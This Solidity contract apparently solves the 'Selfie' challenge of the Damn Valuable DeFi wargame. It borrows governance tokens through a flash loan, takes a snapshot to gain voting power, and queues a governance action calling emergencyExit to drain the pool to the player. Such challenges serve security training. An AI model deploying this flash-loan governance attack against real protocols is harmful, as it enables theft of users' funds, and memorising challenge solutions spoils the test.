// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
contract AttackSelfie is IERC3156FlashBorrower{

    SelfiePool public selfiePool;
    ISimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public _token;
    uint256 actionId;
    address public player;
    uint256 flashAmount=1500000 ether;
    constructor(address _selfiPool,address _simpleGovernance,address token,address _player){
      selfiePool= SelfiePool(_selfiPool);
      simpleGovernance=ISimpleGovernance(_simpleGovernance);
      _token=DamnValuableTokenSnapshot(token);
      player=_player;
    }

     function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
    bytes memory _data=abi.encodeWithSignature("emergencyExit(address)",player);
   DamnValuableTokenSnapshot(token).snapshot();
    actionId=simpleGovernance.queueAction(address(selfiePool) , 0, _data);
    
    DamnValuableTokenSnapshot(token).approve(msg.sender,type(uint).max);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function initialAttack()external{
      selfiePool.flashLoan(
       AttackSelfie(address(this)),
        address(_token),
        flashAmount,
       "0x0"
    );
        
    }

    function finalizeAttack() external{
 
      simpleGovernance.executeAction(actionId);
    }
}